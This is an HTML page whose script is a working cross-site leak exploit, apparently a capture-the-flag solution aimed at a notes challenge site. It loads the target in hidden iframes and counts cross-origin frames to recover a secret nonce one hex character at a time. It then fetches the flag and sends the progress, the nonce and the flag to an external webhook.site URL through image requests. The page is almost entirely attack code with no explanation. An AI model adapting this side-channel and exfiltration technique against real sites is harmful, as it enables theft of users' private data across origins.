<!DOCTYPE html>
<html><body>
<div id="log" style="font-family:monospace;font-size:12px;white-space:pre"></div>
<div id="frames"></div>
<script>
const CHALL = 'https://notes.chall.lac.tf';
const WEBHOOK = 'https://webhook.site/fcbfa7b7-f8f2-42d2-9c53-6f33f061d36d'; // <-- REPLACE with your webhook.site URL
const HEX = '0123456789abcdef';

function log(m){ document.getElementById('log').textContent += m + '\n'; }
function exfil(data){ new Image().src = WEBHOOK + '?d=' + encodeURIComponent(data); }

function testPrefix(prefix) {
    return new Promise(resolve => {
        const v = document.createElement('iframe');
        v.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
        document.getElementById('frames').appendChild(v);
        let done = false;
        function fin(r) { if(done) return; done = true; v.remove(); resolve(r); }
        const to = setTimeout(() => fin(false), 8000);

        v.onload = () => {
            setTimeout(() => {
                let t = 0;
                try { t = v.contentWindow.length; } catch(e) { clearTimeout(to); fin(false); return; }
                if (t === 0) {
                    setTimeout(() => {
                        try { t = v.contentWindow.length; } catch(e) {}
                        nav(t);
                    }, 500);
                } else nav(t);

                function nav(total) {
                    for (let i = 0; i < total; i++) {
                        try { v.contentWindow.frames[i].location = 'about:blank'; } catch(e) {}
                    }
                    setTimeout(() => {
                        let notes = 0;
                        for (let i = 0; i < total; i++) {
                            try { v.contentWindow.frames[i].document; } catch(e) { notes++; }
                        }
                        clearTimeout(to);
                        fin(notes > 0);
                    }, 500);
                }
            }, 200);
        };
        v.src = CHALL + '/?sandbox=x&referrerPolicy=allow-scripts%20allow-same-origin&search=' + encodeURIComponent(prefix);
    });
}

async function leak() {
    let nonce = '';
    for (let pos = 0; pos < 8; pos++) {
        log('pos ' + pos + '...');
        const results = await Promise.all(
            HEX.split('').map(c => testPrefix(nonce + c).then(m => ({char: c, match: m})))
        );
        const hits = results.filter(r => r.match);
        if (hits.length === 1) {
            nonce += hits[0].char;
            log('  -> ' + hits[0].char + ' (' + nonce + ')');
            exfil('pos' + pos + '=' + hits[0].char + '_nonce=' + nonce);
        } else if (hits.length > 1) {
            log('  multi: ' + hits.map(h => h.char).join(',') + ' retrying...');
            for (const h of hits) {
                if (await testPrefix(nonce + h.char)) {
                    nonce += h.char;
                    log('  -> ' + h.char + ' (' + nonce + ')');
                    exfil('pos' + pos + '=' + h.char + '_nonce=' + nonce);
                    break;
                }
            }
            if (nonce.length <= pos) { log('  retry'); pos--; await new Promise(r => setTimeout(r, 500)); }
        } else {
            log('  no match, retry');
            pos--;
            await new Promise(r => setTimeout(r, 500));
        }
    }
    return nonce;
}

(async () => {
    log('Starting...');
    exfil('started');
    const nonce = await leak();
    log('Nonce: ' + nonce);
    exfil('nonce=' + nonce);

    try {
        const r = await fetch(CHALL + '/guess?nonce=' + nonce);
        const t = await r.text();
        log('FLAG: ' + t);
        exfil('flag=' + t);
    } catch(e) {
        log('Error: ' + e.message);
        exfil('error=' + e.message);
    }
})();
</script></body></html>
